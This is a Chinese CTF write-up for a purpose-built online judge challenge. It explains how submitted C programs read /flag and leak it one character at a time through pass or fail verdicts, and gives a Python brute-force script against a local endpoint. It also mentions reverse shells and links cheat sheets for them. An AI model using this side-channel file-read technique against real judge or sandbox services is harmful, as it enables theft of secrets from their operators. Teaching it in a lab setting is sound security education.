# 更适合破晓宝宝的 OJ

- 作者：13m0n4de
- 参考：-
- 难度：Medium
- 分类：PPC
- 暴露端口：12345

## 题目描述

@13m0n4de（黑眼圈经典皮肤版）：

「PPC 有点少啊，你们有什么头猪吗？

「感觉大家要么卡在编程方面，要么卡在安全方面，两种结合起来太痛苦了

「哦，我知道了，做个 OnlineJudge 平台不就好了，让大伙写写代码

「就这么定了吧，你们怎么看」

@Only：「什么是 PPC ？」

@ksks：「什么是 PPC ？」

@Wh1te_0range：「什么是 PPC ？」

@pn1fg：「什么是 PPC ？」

@13m0n4de：「好好好」

> Hint：仔细阅读附件，flag 格式为 `flag{UUID}`，例如 `flag{7c89c43e-f3d2-406d-aa0e-87e97b027984}`，也就是 `^flag{[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}}$`


## 题目解析

### 前言

本题是偏向...Web？

源码来自于以前用 Rust 实现的一个 OJ 系统，按照这个需求文档 [程序设计训练（Rust）](https://lab.cs.tsinghua.edu.cn/rust/) 写的。

但完整的系统对于一个 CTF 题来说有点多余，我做了许多精简，去掉了数据库，去掉了用户和比赛相关的功能，只留下了评测的部分，回过头一看，也许重新写一个反而更快。

本题的源码在[这里](build/)，完整版的 OJ 没放在 GitHub 上，我还要继续完善，也许以后它会作为新的 CTF 题出现（沙箱逃逸？）

尽管在[本题附件](attachments/)中介绍了 OnlineJudge，但还是简单讲一下：

> OJ（Online Judge，在线评测系统）是在课程教学、算法竞赛等场合中用于测试程序正确性的线上系统。用户可以通过友好的界面提交自己的源代码，评测系统在指定的环境中编译代码，使用特定的输入运行程序，并将输出与答案进行比对。

比如大家耳熟能详的力扣（LeetCode）就是一个 OnlineJudge 系统，本校也有工作室搭建了 OJ 系统，可以去体验一下：[星火工作室 OJ]() 。

### 题目介绍

- [README.md](attachments/README.md)：OJ 系统使用指南
- [PROBLEMS.md](attachments/PROBLEMS.md)：题目单
- [API.md](attachments/API.md)：API 文档（只草草的列了一下）

怕有的同学提交程序出问题，给了个示例脚本 `judge.py` 和程序样例 `test.c`，在使用指南中有介绍用法。

### 期望解法

既然 OJ 系统的原理是编译我们提交的代码并运行，那必然可能带来一些安全问题，比如编写程序读取 `/flag` 文件内容。（使用指南中也在不断暗示有 `/flag` 这么个文件。） 

可惜我们读取后并没有办法得到结果，因为系统只返回几个信息：编译错误、答案错误、答案成功，不会显示程序的输出。

但是，我们可以只读取 `/flag` 的第一个字符，将它与一个字符（比如说 `'f'`） 进行比较，如果正确，则输出符合测试用例的值，否则随意输出不正确的值，根据系统返回的信息来判断第一个字符是不是 `'f'`，以此类推。

**本题的期望解法就是通过测试用例的返回（通过与否）来猜解 `/flag` 文件内容。**

提交代码大致如下：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *file = fopen("/flag", "rb");
    int position = 0;
    fseek(file, (long)position, SEEK_SET);
    
    char character;
    fread(&character, 1, 1, file);
    
    if (character == 'f') {
        printf("符合测试用例的值");
        fclose(file);
        return 0;
    } else {
        fclose(file);
        fprintf(stderr, "不符合测试用例的值");
        return 1;
    }
}
```

可能你有疑问：那我怎么可能知道符合测试用例的值是什么？

实际上第零题 `[0] 输出 Hello World!` 中明确给出了，输出一个 `Hello World!` 即可，它只有一个测试用例。

那程序就成了下面这样：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *file = fopen("/flag", "rb");
    int position = 0;
    fseek(file, (long)position, SEEK_SET);
    
    char character;
    fread(&character, 1, 1, file);
    
    if (character == 'f') {
        printf("Hello World!");
        fclose(file);
        return 0;
    } else {
        fclose(file);
        fprintf(stderr, "Hack for fun");
        return 1;
    }
}
```

提交之后即可猜解第一个字符，如果 `/flag` 内容中首个字符为 `f` ，那系统就会返回 `Accepted`。

```json
{
  "id": 0,
  "created_time": "2023-10-22T12:02:08.515Z",
  "updated_time": "2023-10-22T12:02:08.515Z",
  "submission": {
    "source_code": "...",
    "language": "C",
    "problem_id": 0
  },
  "state": "Finished",
  "result": "Accepted",
  "cases": [
    {
      "result": "Compilation Success",
      "time": 0,
      "memory": 0
    },
    {
      "result": "Accepted",
      "time": 0,
      "memory": 0
    }
  ],
  "flag": "..."
}
```

如果每个字符都要手动猜实在太崩溃了，来写一个 Python 脚本：

[solve_c.py](writeup/solve_c.py)

```python
import requests


session = requests.Session()
url = "http://localhost:12345/jobs"

flag = ""

payload = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    FILE *file = fopen("/flag", "rb");
    int position = %POSITION%;
    fseek(file, (long)position, SEEK_SET);
    
    char character;
    fread(&character, 1, 1, file);
    
    if (character == '%GUESS%') {
        printf("Hello World!");
        fclose(file);
        return 0;
    } else {
        fclose(file);
        fprintf(stderr, "Hack for fun");
        return 1;
    }
}
"""

for pos in range(42):
    for guess in '0123456789abcdefgl-{}':
        data = {
            "language": "C",
            "problem_id": 0,
            "source_code": payload.replace("%POSITION%", str(pos)).replace("%GUESS%", guess),
        }
        resp = session.post(url=url, json=data)
        resp_json = resp.json()

        if resp_json["result"] == "Accepted":
            flag += guess
            print(flag)
            break

```

在脚本中我把 C 语言程序中读取位置改成了 `%POSITION%`，猜解字符改成了 `%GUESS%`，在 Python 脚本中对它们进行替换后再发送，这样就可以实现自动猜解了。

程序不太快，因为每次都需要编译 C 语言文件，而且还有优化空间，比如通过了第零题 `[0] 输出 Hello World!` 是可以获取一部分 FLAG 的，并且 FLAG 的格式也比较确定，一些位置的字符猜解多余。

但这样写代码看着干净，没那么追求速度，主要是给大家一个参考。

![get_flag](writeup/images/get_flag.gif)

### 老实人解法

比较善良，当程序通过全部测试用例时真的会返回一部分 FLAG，只要做完全部的题目就能拼出完整的 FLAG。

这些都是网上常见编程题，也不涉及算法和数据结构，希望大家能试着写一写。

要注意末尾不能有多余换行和空格！

我在这里给出几段自己代码供大家参考：

0. 输出 Hello World!：[hello.c](writeup/hello.c)
1. 回文数：[palindrome_number.c](writeup/palindrome_number.c)
2. 转换成小写字母：[to_lower_case.c](writeup/to_lower_case.c)
3. 倍数求和：[sum_multiples.c](writeup/sum_multiples.c)

## 碎碎念

### 干嘛不写个易用的客户端？

~~除去我确实懒以外~~，其实是想让同学们了解一些网络请求相关的知识，比如 JSON，HTTP 请求协议。

大家在复现的时候也可以试试使用 PostMan、BurpSuite 等工具发送数据包，以后在写代码或者做 CTF 题时会经常用到。

### 有没有更快的解法？

理论是可以更快一些的，因为 GET `/jobs` 会返回全部的结果，所以我们不需要逐个处理返回，多线程发送多个猜解请求，最后再 GET 一次 `/jobs` 处理全部结果。

但是，由于容器资源分配有限、OJ 系统代码不是异步等等原因，实际并不会快。

### writeup 文件夹里多出的文件是啥？

最开始的时候，这题支持很多种语言，包括 Rust、Go 之类的。

但因为要安装许多构建工具，Docker 镜像大得夸张，就又去掉只剩下了 C。

后来觉得不爽，加上了 CPP，这个不会太影响镜像大小。

于是你能在 writeup 文件夹下看到遗留的 [solve_rust.py](writeup/solve_rust.py) 和 [solve_go.py](writeup/solve_go.py)，这是猜解脚本的 Rust 和 Go 语言版本。

### 反弹 Shell ？

本题并没有对提交的代码进行任何限制，对出网也是，所以完全可以把数据外带，或者干脆反弹 Shell。

但不是这题的本意，因为这样就变成了另外的题型，可想了想还是把这种可能性留下了。

想着如果有同学是这么做的也好啊，对大一新生来说是个学习的机会，可惜好像根本没人碰这题。

总之这里有一些反弹 Shell 的资料，感兴趣的同学可以试一下。

- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

- [HackTricks - Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)